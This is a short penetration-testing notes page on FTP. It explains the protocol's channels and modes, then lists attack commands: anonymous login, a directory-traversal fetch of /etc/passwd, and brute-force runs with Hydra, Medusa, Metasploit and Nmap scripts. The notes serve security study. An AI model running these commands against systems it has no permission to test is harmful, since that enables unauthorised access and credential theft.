---
tags:
  - Penetration-Testing
  - Services
---
## What is FTP?
Protocol used to allow remote transfer of files over a network.
- Operates using two channels: **command channel** & **data channel**
	- Command Channel is used to transmit commands as well as command replies.
	- Data Channel is used to transfer data.
- Separation of command & data into separate channels allows commands to be sent to the server w/o having to wait on data transfers.

**Active vs Passive FTP Connection**
- Active FTP = **client** opens port and listens, server is **required** to actively connect to the port.
- Passive FTP = **server** opens a port and listens passively, client connects to it.

## Enumerating FTP
**Ensure FTP client is installed on attacker system**
- Type ftp, if ftp> appears, client is on the box.

**Begin with [[Penetration Testing/Nmap|Nmap]]

## Exploiting FTP

### Anonymous Login
```bash
ftp target_ip
Name (target_ip:anonymous): anonymous
Password: [press Enter]
```

### Directory Traversal
- Exploit input validation to access directories outside FTP root
```bash
ftp> get ../../../etc/passwd
```

### Brute Force
- Hydra
```bash
hydra -l username -P passwordlist.txt ftp://target_ip
```

- Medusa
```bash
medusa -h target_ip -u username -P passwordlist.txt -M ftp
```

- Metasploit
```bash
use auxiliary/scanner/ftp/ftp_login
```

- Nmap Scripts
```bash
nmap --script ftp-brute -p 21 target_ip

nmap --script ftp-vsftpd-backdoor -p 21 target_ip
```

- FTPMap
```bash
ftpmap -v -u username -p passwordlist.txt target_ip
```
